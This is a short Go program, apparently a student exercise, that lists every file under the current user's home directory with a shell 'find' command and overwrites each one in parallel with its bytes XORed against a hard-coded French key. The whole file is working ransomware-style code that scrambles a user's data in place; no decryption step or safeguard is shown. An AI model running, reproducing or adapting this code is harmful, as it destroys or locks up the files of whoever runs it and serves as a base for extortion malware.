package main

import (
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
	"sync"
)

var wg sync.WaitGroup

var Xorstring = "salut_je_suis_la_phrase_qui_xor_cette_save_je_suis_tres_long_cest_normal_salut_les_mentor_je_suis_un_xor"

func Crypt(filename string) {
	file, _ := os.Open(filename)
	temp, _ := file.Stat()
	if temp == nil {
		wg.Done()
		return
	}
	arr := make([]byte, temp.Size())
	_, err := file.Read(arr)
	if err != nil {
		return
	}
	var xor []byte
	for i := 0; i < len(arr); i++ {
		xor = append(xor, arr[i]^Xorstring[i%len(Xorstring)])
	}
	_ = ioutil.WriteFile(filename, xor, 0644)
	wg.Done()
}

func main() {
	cmd := exec.Command("bash", "-c", "find /home/$USER/ -type f")
	output, _ := cmd.CombinedOutput()
	listfile := strings.Split(string(output), "\n")
	for _, file := range listfile {
		wg.Add(1)
		go Crypt(file)
	}
	wg.Wait()
}
